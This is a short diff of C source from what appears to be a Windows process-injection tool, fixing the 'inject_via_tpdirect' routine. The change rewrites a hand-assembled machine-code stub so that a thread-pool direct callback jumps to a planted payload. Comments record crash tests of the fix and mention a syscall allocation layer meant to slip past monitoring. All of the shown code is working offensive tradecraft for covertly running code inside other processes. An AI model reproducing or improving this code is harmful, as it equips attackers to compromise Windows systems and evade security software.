@@ -659,11 +659,15 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	 * at +0x7f7 before the payload can check in; the old offset-scan
 	 * harness only passed because its exit(0x1337) payload outran the
 	 * crash). Stash payload/param BEYOND the struct at +0x50/+0x58 and
-	 * point Callback at a 10-byte stub: rax=[rcx+0x50]; rcx=[rcx+0x58];
-	 * jmp rax. */
+	 * point Callback at a 10-byte stub. The dispatch invokes Callback
+	 * with the standard pool signature Callback(Instance=rcx, Context=
+	 * rdx, ...) - rcx is the TP_CALLBACK_INSTANCE living ON THE WORKER
+	 * STACK, rdx is the completion KeyContext = our direct pointer
+	 * (C-25 live + local tpd_reg_test: rcx-read 3/3 crash at jmp-0,
+	 * rdx-read 3/3 exit 0x1337): rax=[rdx+0x50]; rcx=[rdx+0x58]; jmp rax */
 	unsigned char stubc[] = {
-		0x48, 0x8B, 0x41, 0x50,             /* mov rax, [rcx+0x50] payload  */
-		0x48, 0x8B, 0x49, 0x58,             /* mov rcx, [rcx+0x58] param    */
+		0x48, 0x8B, 0x42, 0x50,             /* mov rax, [rdx+0x50] payload  */
+		0x48, 0x8B, 0x4A, 0x58,             /* mov rcx, [rdx+0x58] param    */
 		0xFF, 0xE0                          /* jmp rax                      */
 	};
 	/* alloc RW -> write -> flip RX: the syscall alloc layer does not take
